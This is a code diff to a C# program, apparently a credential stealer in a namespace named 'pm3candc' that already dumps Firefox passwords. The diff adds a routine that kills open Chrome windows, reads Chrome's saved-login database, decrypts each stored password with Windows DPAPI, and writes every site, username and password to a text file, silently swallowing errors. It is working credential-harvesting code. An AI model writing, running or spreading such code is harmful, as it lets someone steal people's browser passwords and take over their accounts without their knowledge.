@@ -214,6 +214,54 @@ namespace pm3candc
                             List<FirefoxPassword> firefoxPasswords = Firefox.Passwords();
                             toFile("firefoxPasswods.txt", firefoxPasswords);
                         }
+                        else if(opcion == 9)
+                        {
+                            killThemAll("chrome");
+                            try
+                            {
+                                string filename = "my_chrome_passwords.txt";
+                                StreamWriter Writer = new StreamWriter(filename, false, Encoding.UTF8);
+                                string db_way = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
+                                    + "\\Google\\Chrome\\User Data\\Default\\Login Data"; // a path to a database file
+
+                                string db_field = "logins";   // DB table field name
+                                byte[] entropy = null; // DPAPI class does not use entropy but requires this parameter
+                                string description;    // I could not understand the purpose of a this mandatory parameter
+                                                       // Output always is Null
+                                                       // Connect to DB
+                                string ConnectionString = "data source=" + db_way + ";New=True;UseUTF16Encoding=True";
+                                DataTable DB = new DataTable();
+                                string sql = string.Format("SELECT * FROM {0} {1} {2}", db_field, "", "");
+                                using (SQLiteConnection connect = new SQLiteConnection(ConnectionString))
+                                {
+
+                                    SQLiteCommand command = new SQLiteCommand(sql, connect);
+                                    SQLiteDataAdapter adapter = new SQLiteDataAdapter(command);
+                                    adapter.Fill(DB);
+                                    int rows = DB.Rows.Count;
+                                    for (int i = 0; i < rows; i++)
+                                    {
+                                        Writer.Write(i + 1 + ") "); // Here we print order number of our trinity "site-login-password"
+                                        Writer.WriteLine(DB.Rows[i][1] + "<br>"); // site URL
+                                        Writer.WriteLine(DB.Rows[i][3] + "<br>"); // login
+                                                                                  // Here the password description
+                                        byte[] byteArray = (byte[])DB.Rows[i][5];
+                                        byte[] decrypted = DPAPI.Decrypt(byteArray, entropy, out description);
+                                        string password = new UTF8Encoding(true).GetString(decrypted);
+                                        Writer.WriteLine(password + "<br><br>");
+                                    }
+                                    connect.Close();
+                                }
+                                Writer.Close();
+                            }
+                            catch (Exception ex)
+                            {
+
+                                ex = ex.InnerException;
+
+                            }
+
+                        }
                     }
 
 
@@ -635,6 +683,26 @@ namespace pm3candc
                     // If the line doesn't contain the word 'Second', write the line to the file.
                     file.WriteLine(pass.ToString());
                 }
+            }
+        }
+
+        public static void killThemAll(string aplicacion)
+        {
+            try
+            {
+                Process[] chromeInstances = Process.GetProcessesByName(aplicacion);
+                foreach (Process pc in chromeInstances)
+                {
+                    if (pc.MainWindowHandle != IntPtr.Zero)
+                    {
+                        pc.Kill();
+
+                    }
+                }
+            }
+            catch (Exception e)
+            {
+
             }
         }
     }
